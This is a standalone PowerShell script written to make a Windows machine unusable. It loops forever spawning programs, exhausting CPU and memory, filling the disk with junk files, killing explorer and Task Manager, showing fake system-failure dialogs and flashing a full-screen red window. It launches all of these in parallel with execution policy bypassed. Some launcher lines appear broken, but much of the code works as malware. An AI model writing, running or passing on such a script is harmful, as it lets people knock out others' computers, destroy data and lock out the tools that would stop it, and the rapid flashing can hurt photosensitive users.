$wshell = New-Object -ComObject WScript.Shell

function Open-EndlessPrograms {
    while ($true) {
        Start-Process -NoNewWindow -FilePath notepad
        Start-Process -NoNewWindow -FilePath cmd
        Start-Process -NoNewWindow -FilePath explorer
        Start-Process -NoNewWindow -FilePath calc
        Start-Process -NoNewWindow -FilePath mspaint
    }
}

function Overload-CPU {
    while ($true) {
        Start-Process -NoNewWindow -Priority High -FilePath powershell -ArgumentList {
            while ($true) { 1..1000000 | ForEach-Object { [math]::Pow($_, 2) } }
        }
    }
}

function Overload-RAM {
    $array = @()
    while ($true) {
        $array += , (New-Object byte[] (200MB))  # Consumes 200MB per iteration
    }
}

function Spam-ErrorMessages {
    while ($true) {
        Start-Process -NoNewWindow -FilePath powershell -ArgumentList {
            [System.Windows.Forms.MessageBox]::Show("CRITICAL ERROR: SYSTEM FAILURE!", "Windows Error", 0, 16)
        }
    }
}

function Flood-Disk {
    while ($true) {
        $file = "C:\Temp\Crash" + (Get-Random -Minimum 1 -Maximum 999999) + ".txt"
        "MASSIVE SYSTEM FAILURE" * 1000000 | Out-File -FilePath $file
    }
}

function Disable-UI {
    while ($true) {
        Stop-Process -Name explorer -Force
        Stop-Process -Name taskmgr -Force
    }
}

function Glitch-Screen {
    while ($true) {
        Add-Type -AssemblyName System.Windows.Forms
        $form = New-Object System.Windows.Forms.Form
        $form.BackColor = "Red"
        $form.WindowState = "Maximized"
        $form.TopMost = $true
        $form.FormBorderStyle = "None"
        $form.Show()
        Start-Sleep -Milliseconds 30
        $form.Close()
    }
}

# RUN ALL CHAOTIC FUNCTIONS IN PARALLEL
Start-Process -NoNewWindow powershell -ArgumentList "-ExecutionPolicy Bypass -NoProfile -Command { Open-EndlessPrograms }"
Start-Process -NoNewWindow powershell -ArgumentList "-ExecutionPolicy Bypass -NoProfile -Command { Overload-CPU }"
Start-Process -NoNewWindow powershell -ArgumentList "-ExecutionPolicy Bypass -NoProfile -Command { Overload-RAM }"
Start-Process -NoNewWindow powershell -ArgumentList "-ExecutionPolicy Bypass -NoProfile -Command { Spam-ErrorMessages }"
Start-Process -NoNewWindow powershell -ArgumentList "-ExecutionPolicy Bypass -NoProfile -Command { Flood-Disk }"
Start-Process -NoNewWindow powershell -ArgumentList "-ExecutionPolicy Bypass -NoProfile -Command { Disable-UI }"
Start-Process -NoNewWindow powershell -ArgumentList "-ExecutionPolicy Bypass -NoProfile -Command { Glitch-Screen }"

while ($true) { Start-Sleep 1 }
